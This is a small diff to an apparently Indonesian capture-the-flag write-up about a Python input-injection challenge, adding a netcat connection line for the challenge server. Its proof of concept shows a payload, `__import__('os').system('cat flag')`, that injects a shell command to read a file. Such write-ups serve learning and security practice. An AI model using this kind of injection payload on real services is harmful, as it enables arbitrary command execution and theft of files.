@@ -4,6 +4,8 @@ Kenalan Dulu Dong :)
 ## Deskripsi Soal
 Input Berbahaya pada ular
 
+nc [host]:[port]
+
 ---
 ## Proof of Concept
 - `__import__('os').system('cat flag')`
